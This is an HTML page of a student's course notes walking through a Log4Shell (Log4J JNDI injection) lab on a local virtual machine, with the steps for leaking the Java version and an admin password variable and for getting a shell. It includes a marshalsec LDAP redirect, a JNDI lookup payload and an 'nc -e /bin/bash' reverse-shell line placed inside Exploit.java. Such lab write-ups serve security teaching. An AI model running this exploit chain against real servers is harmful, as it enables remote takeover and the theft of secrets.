@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Intro to Information Security 3 | Log4J Vulnerabilities &mdash; serenefield-sphinx  documentation</title>
+      <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+      <link rel="stylesheet" href="../_static/style.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
+        <script src="../_static/jquery.js"></script>
+        <script src="../_static/underscore.js"></script>
+        <script src="../_static/_sphinx_javascript_frameworks_compat.js"></script>
+        <script src="../_static/doctools.js"></script>
+        <script src="../_static/sphinx_highlight.js"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+            <a href="../index.html" class="icon icon-home"> serenefield-sphinx
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Japanese</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Jap/index.html">Japanese</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Guitar</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Guitar/index.html">Guitar</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Computer Network</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../CN/index.html">Computer Network</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">High Performance Computing</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../HPC/index.html">High Performance Computing</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Dev Logs</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../logs/index.html">Develop Logs</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Information Security</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="note1.html">Intro to Information Security 1 | Modular Calculation and Software Vulnerabilities</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Tests</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../tests/index.html">Test</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">serenefield-sphinx</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home"></a></li>
+      <li class="breadcrumb-item active">Intro to Information Security 3 | Log4J Vulnerabilities</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/IIS/note3.md.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="intro-to-information-security-3-log4j-vulnerabilities">
+<h1>Intro to Information Security 3 | Log4J Vulnerabilities<a class="headerlink" href="#intro-to-information-security-3-log4j-vulnerabilities" title="Permalink to this heading"></a></h1>
+<section id="log4j">
+<h2>1. Log4J<a class="headerlink" href="#log4j" title="Permalink to this heading"></a></h2>
+<section id="intro">
+<h3>(1) Intro<a class="headerlink" href="#intro" title="Permalink to this heading"></a></h3>
+<ul class="simple">
+<li><p><strong>Log4J</strong> is a very popular open-source framework that allows application developers to log important messages such as program flow, program state, exceptions, etc. These messages can include user input, dynamic data, database results, etc.</p></li>
+<li><p><strong>Java Naming and Directory Interface (JNDI)</strong> creates a way for Java Objects to be looked up at runtime. An application only needs to know the JNDI name instead of having to have the connection details. JNDI uses Naming References if the object is too large.</p></li>
+<li><p><strong>Lightweight Directory Access Protocol (LDAP)</strong> provides the communication language that is required to receive and send information from directory services. It is not specific to Java. . It can be used for authentication like sending usernames/passwords or retrieving object data through a url from another server.</p></li>
+<li><p><strong>Log4J Lookups</strong> allow string substitution of certain strings. These are in the form of <code class="docutils literal notranslate"><span class="pre">${prefix:name}</span></code>. For example:</p>
+<ul>
+<li><p><strong><code class="docutils literal notranslate"><span class="pre">${java:runtime}</span></code></strong>: gives java runtime version like <code class="docutils literal notranslate"><span class="pre">Java(TM)</span> <span class="pre">SE</span> <span class="pre">Runtime</span> <span class="pre">Environment</span> <span class="pre">(build</span> <span class="pre">1.7.0_67-b01)</span> <span class="pre">from</span> <span class="pre">Oracle</span> <span class="pre">Corporation</span></code></p></li>
+<li><p><strong><code class="docutils literal notranslate"><span class="pre">${java:version}</span></code></strong>: gives java short version information like <code class="docutils literal notranslate"><span class="pre">Java</span> <span class="pre">version</span> <span class="pre">1.7.0_67</span></code></p></li>
+<li><p><strong><code class="docutils literal notranslate"><span class="pre">${env:USER}</span></code></strong>: gives the value of environment variable <code class="docutils literal notranslate"><span class="pre">USER</span></code></p></li>
+</ul>
+</li>
+</ul>
+</section>
+<section id="servers-setup">
+<h3>(2) Servers Setup<a class="headerlink" href="#servers-setup" title="Permalink to this heading"></a></h3>
+<p>Let’s first open three terminals in the virtual machine. In the first terminal, we should start the LDAP server by,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ cd ~/Desktop/log4shell/target
+$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:4242/#Exploit&quot;
+</pre></div>
+</div>
+<p>In the second terminal, we should run the malicious server by,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ python3 -m http.server 4242 
+</pre></div>
+</div>
+<p>In the last terminal, we should can use <code class="docutils literal notranslate"><span class="pre">nc</span></code> command to listen to the port that we specified. For example, if we want to listen to the port <code class="docutils literal notranslate"><span class="pre">8888</span></code>, we can run,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ nc -nlvp 8888
+</pre></div>
+</div>
+<p>See what the options of <code class="docutils literal notranslate"><span class="pre">nc</span></code> means from this <a class="reference external" href="https://www.explainshell.com/explain?cmd=nc+-nlvp+8888">link</a>.</p>
+</section>
+<section id="task-0-get-java-version">
+<h3>(3) Task 0: get Java version<a class="headerlink" href="#task-0-get-java-version" title="Permalink to this heading"></a></h3>
+<p>We can use <code class="docutils literal notranslate"><span class="pre">curl</span></code> to interact with Log4J. For example, we can run,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ curl &#39;http://localhost:8080/rest/users/ping&#39; -H &#39;GATECH_ID:123456789&#39;
+</pre></div>
+</div>
+<p>This will send a get request to <code class="docutils literal notranslate"><span class="pre">http://localhost:8080/rest/users/ping</span></code> with the <code class="docutils literal notranslate"><span class="pre">GATECH_ID</span></code> variable in the HTTP header set to <code class="docutils literal notranslate"><span class="pre">123456789</span></code>.</p>
+<p>We can assign more information in the header like,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ curl &#39;http://localhost:8080/rest/users/userlist&#39; \
+-H &#39;GATECH_ID:123456789&#39; \
+-H &#39;Accept:application/json&#39; \
+-H &#39;X-UserName:rcoleman8&#39;
+</pre></div>
+</div>
+<p>Then we can go and view the file <code class="docutils literal notranslate"><span class="pre">log/cs6035.log</span></code> and see the logs from the server. Then we can figure out,</p>
+<ul class="simple">
+<li><p>From the line <code class="docutils literal notranslate"><span class="pre">...</span> <span class="pre">INFO</span> <span class="pre">GET</span> <span class="pre">...</span></code>, the <code class="docutils literal notranslate"><span class="pre">Accept</span></code> key is assigned with value <code class="docutils literal notranslate"><span class="pre">application/json</span></code></p></li>
+<li><p>From the line <code class="docutils literal notranslate"><span class="pre">...</span> <span class="pre">DEBUG</span> <span class="pre">****</span> <span class="pre">...</span> <span class="pre">GATECH_ID</span> <span class="pre">...</span></code>, the <code class="docutils literal notranslate"><span class="pre">GATECH_ID</span></code> key is assigned with value <code class="docutils literal notranslate"><span class="pre">123456789</span></code></p></li>
+<li><p>From the line <code class="docutils literal notranslate"><span class="pre">...</span> <span class="pre">INFO</span> <span class="pre">X-UserName</span> <span class="pre">...</span></code>, the <code class="docutils literal notranslate"><span class="pre">X-UserName</span></code> key is assigned with value <code class="docutils literal notranslate"><span class="pre">rcoleman8</span></code></p></li>
+</ul>
+<p>Now our task is to change the value of <code class="docutils literal notranslate"><span class="pre">Accept</span></code> to the version of Java on the server. Recall the string substitution we have talked about above and configure the following command.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ curl &#39;http://localhost:8080/rest/users/ping&#39; \
+-H &#39;GATECH_ID:123456789&#39; \
+-H &#39;Accept:application/json&#39; \
+</pre></div>
+</div>
+<p>Then we should get something in the log like,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">...</span>
+<span class="p">[</span><span class="o">...</span><span class="p">]</span> <span class="n">GET</span><span class="p">,</span> <span class="n">In</span> <span class="n">service</span> <span class="n">method</span> <span class="o">-</span> <span class="o">...</span> <span class="o">-</span> <span class="n">Accept</span><span class="p">:</span> <span class="n">Java</span> <span class="n">version</span> <span class="mf">1.8.0_20</span>
+<span class="o">...</span>
+</pre></div>
+</div>
+<p>Remember we have at least 4 keys we can use to exploit. These are,</p>
+<ul class="simple">
+<li><p>GATECH_ID</p></li>
+<li><p>Content-type</p></li>
+<li><p>Accept</p></li>
+<li><p>X-UserName</p></li>
+</ul>
+</section>
+<section id="task-1-get-environment-variable">
+<h3>(1) Task 1: get environment variable<a class="headerlink" href="#task-1-get-environment-variable" title="Permalink to this heading"></a></h3>
+<p>Recall again for the string substitution part and this time we have to get the value of an environment variable <code class="docutils literal notranslate"><span class="pre">ADMIN_PASSWORD</span></code>. Modify the following command to construct a malicious payload,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ curl &#39;http://localhost:8080/rest/users/ping&#39; \
+-H &#39;GATECH_ID:123456789&#39; \
+-H &#39;Accept:application/json&#39; \
+</pre></div>
+</div>
+<p>Then find the flag 1 in the result.</p>
+</section>
+<section id="task-2-get-a-shell">
+<h3>(2) Task 2: Get a shell<a class="headerlink" href="#task-2-get-a-shell" title="Permalink to this heading"></a></h3>
+<p>If you closed the terminals in the setup stage and the ports are not available, you can try to restart the virtual machine and rerun the setups.</p>
+<p>In this task, we will try to get a shell by log4J, and this task simply shows why this vulnerability is serious. To exploit this task, you will find <a class="reference external" href="https://www.youtube.com/watch?v=lJeAgQQaDEw">this video</a> useful.</p>
+<p>To solve this problem, we have to open 4 terminals.</p>
+<p>In the first terminal, we have to start the LDAP server by,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ cd ~/Desktop/log4shell/target
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:4242/#Exploit&quot;
+</pre></div>
+</div>
+<p>This will redirect LDAP to <code class="docutils literal notranslate"><span class="pre">4242</span></code> port and listen to the requests to the <code class="docutils literal notranslate"><span class="pre">1389</span></code> port.</p>
+<p>In the second terminal, we have to go to the <code class="docutils literal notranslate"><span class="pre">Flag2</span></code> directory and finish the exploit file. After that, we should compile the exploit file and make the current directory a malicious server.</p>
+<p>To modify the exploit file <code class="docutils literal notranslate"><span class="pre">Exploit.java</span></code>, the first step is to find the internal IP address of the current VM (aka. Attacker IP). We can use the following command to check it out,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ cd Desktop/log4shell/Flag2
+$ hostname -I | awk &#39;{print $1}&#39;
+</pre></div>
+</div>
+<p>Then we have to modify the exploit file. The following line can be used to get the shell,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s2">&quot;nc -e /bin/bash &lt;Attacker IP&gt; &lt;Target Port&gt;&quot;</span><span class="p">);</span>
+</pre></div>
+</div>
+<p>The video will help to understand the line above. Then we should compile this file by,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ javac Exploit.java
+</pre></div>
+</div>
+<p>And it will generate a <code class="docutils literal notranslate"><span class="pre">Exploit.class</span></code> file and we should use it as our entry point to execute. Finally, we should make the current directory a server on the port <code class="docutils literal notranslate"><span class="pre">4242</span></code> to get the request from the LDAP server. The <code class="docutils literal notranslate"><span class="pre">Target</span> <span class="pre">Port</span></code> is used to listen the information after we execute the exploit file. We can assign it to <code class="docutils literal notranslate"><span class="pre">8888</span></code> or <code class="docutils literal notranslate"><span class="pre">9999</span></code> or whatever we like.</p>
+<p>In the third terminal, we should use <code class="docutils literal notranslate"><span class="pre">nc</span></code> command to listen to the <code class="docutils literal notranslate"><span class="pre">Target</span> <span class="pre">Port</span></code> we have assigned (should be <code class="docutils literal notranslate"><span class="pre">8888</span></code> or <code class="docutils literal notranslate"><span class="pre">9999</span></code> or else).</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ nc -nvlp &lt;Target Port&gt;
+</pre></div>
+</div>
+<p>In the last terminal, we have to run our payload by <code class="docutils literal notranslate"><span class="pre">curl</span></code>. It should be similar to the ones we have used in task0 and task1. The lookup should have the following structure,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>${jndi:ldap://&lt;attackerIP&gt;:1389/&lt;exploitFileName&gt;}
+</pre></div>
+</div>
+<p>Where <code class="docutils literal notranslate"><span class="pre">1389</span></code> is the port that the LDAP server will listen.</p>
+<p>After we get the shell, we can use the following commands to get the flag2,</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cd</span> <span class="o">../..</span>
+<span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">Flag2</span><span class="o">.</span><span class="n">jar</span>
+</pre></div>
+</div>
+</section>
+<section id="id1">
+<h3>(3)<a class="headerlink" href="#id1" title="Permalink to this heading"></a></h3>
+</section>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2023, Yufeng Xing.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
